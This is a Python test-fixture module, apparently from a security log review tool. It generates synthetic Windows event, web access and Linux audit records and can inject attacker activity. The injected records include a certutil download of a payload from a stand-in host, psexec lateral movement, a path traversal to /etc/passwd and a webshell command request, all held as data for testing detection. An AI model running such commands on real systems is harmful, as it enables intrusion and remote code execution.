"""Shared test doubles for the review package: a deterministic embedder and generators of
production-SHAPED records (Windows-style dict records, web access logs, Linux audit lines)
-- the shapes the old signature path mishandled -- rather than hand-made verb lists."""

from __future__ import annotations

import hashlib
import random
import re
from collections.abc import Sequence
from typing import Any

_TOKEN = re.compile(r"[a-z0-9<>_\-.]+")


class HashEmbedder:
    """Bag-of-hashed-tokens, 256 dims: deterministic, lexical, enough to test retrieval logic."""

    identity = "hash-bow-256"

    def embed(self, texts: Sequence[str]) -> list[list[float]]:
        out: list[list[float]] = []
        for text in texts:
            vec = [0.0] * 256
            for token in _TOKEN.findall(text.lower()):
                bucket = int(hashlib.md5(token.encode(), usedforsecurity=False).hexdigest()[:8], 16)
                vec[bucket % 256] += 1.0
            out.append(vec)
        return out


_IMAGES = ["chrome.exe", "outlook.exe", "svchost.exe", "explorer.exe", "teams.exe", "code.exe"]
_BENIGN_CMD = [
    "--type=renderer",
    "/background",
    "-k netsvcs",
    "--no-sandbox",
    "/autorun",
    "-embedding",
]
_ATTACK_CHAIN = [
    ("whoami.exe", "whoami /all"),
    ("net.exe", "net user /domain"),
    ("certutil.exe", "certutil -urlcache -f http://x/payload.bin"),
    ("psexec.exe", "psexec \\\\target -s cmd.exe"),
]


def _ts(base: float, i: int, rng: random.Random) -> str:
    return f"2026-10-0{1 + (i % 3)}T{(i // 60) % 24:02d}:{i % 60:02d}:{rng.randint(0, 59):02d}Z"


def windows_records(
    n: int, *, seed: int, hosts: int = 12, users: int = 20, attacker: str | None = None
) -> list[dict[str, Any]]:
    """Splunk-style dict records (the shape that collapsed to ``event-N:record``)."""
    rng = random.Random(seed)
    out: list[dict[str, Any]] = []
    for i in range(n):
        host = f"WKS{rng.randint(1, hosts):02d}"
        user = f"user{rng.randint(1, users)}"
        image = rng.choice(_IMAGES)
        out.append(
            {
                "_time": _ts(0.0, i, rng),
                "host": host,
                "TargetUserName": user,
                "EventCode": rng.choice(["4624", "4688", "4688", "4688", "4672", "4634"]),
                "Image": f"C:\\Program Files\\App\\{image}",
                "CommandLine": f"{image} {rng.choice(_BENIGN_CMD)}",
            }
        )
    if attacker:
        for step, (image, cmd) in enumerate(_ATTACK_CHAIN):
            out.append(
                {
                    "_time": f"2026-10-02T03:{10 + step:02d}:00Z",
                    "host": "WKS05",
                    "TargetUserName": attacker,
                    "EventCode": "4688",
                    "Image": f"C:\\Windows\\System32\\{image}",
                    "CommandLine": cmd,
                }
            )
    return out


def web_records(
    n: int, *, seed: int, clients: int = 30, attacker_ip: str | None = None
) -> list[dict[str, Any]]:
    rng = random.Random(seed)
    out: list[dict[str, Any]] = []
    for i in range(n):
        out.append(
            {
                "ts": _ts(0.0, i, rng),
                "clientip": f"10.1.{rng.randint(0, 3)}.{rng.randint(1, clients)}",
                "method": rng.choice(["GET", "GET", "POST"]),
                "uri": rng.choice(["/index.html", "/login", "/static/app.js", "/api/items"]),
                "status": rng.choice([200, 200, 200, 304, 404]),
            }
        )
    if attacker_ip:
        for step, uri in enumerate(["/admin", "/admin/../../etc/passwd", "/upload.php?cmd=whoami"]):
            out.append(
                {
                    "ts": f"2026-10-02T03:1{step}:30Z",
                    "clientip": attacker_ip,
                    "method": "GET",
                    "uri": uri,
                    "status": 200,
                }
            )
    return out


def linux_records(n: int, *, seed: int, hosts: int = 12) -> list[dict[str, Any]]:
    rng = random.Random(seed)
    out: list[dict[str, Any]] = []
    for i in range(n):
        out.append(
            {
                "time": _ts(0.0, i, rng),
                "hostname": f"WKS{rng.randint(1, hosts):02d}",
                "uid": f"user{rng.randint(1, 20)}",
                "exe": rng.choice(["/usr/bin/bash", "/usr/bin/python3", "/usr/sbin/cron"]),
                "cmd": rng.choice(["ls -la", "python3 job.py", "cron -f", "bash -c uptime"]),
                "syscall": rng.choice(["execve", "openat", "connect"]),
            }
        )
    return out


def three_source_window(
    *, seed: int = 1, n: int = 400, attacker: str | None = None
) -> dict[str, list[dict[str, Any]]]:
    return {
        "wineventlog": windows_records(n, seed=seed, attacker=attacker),
        "web:access": web_records(n, seed=seed + 1, attacker_ip="10.9.9.9" if attacker else None),
        "linux:audit": linux_records(n, seed=seed + 2),
    }
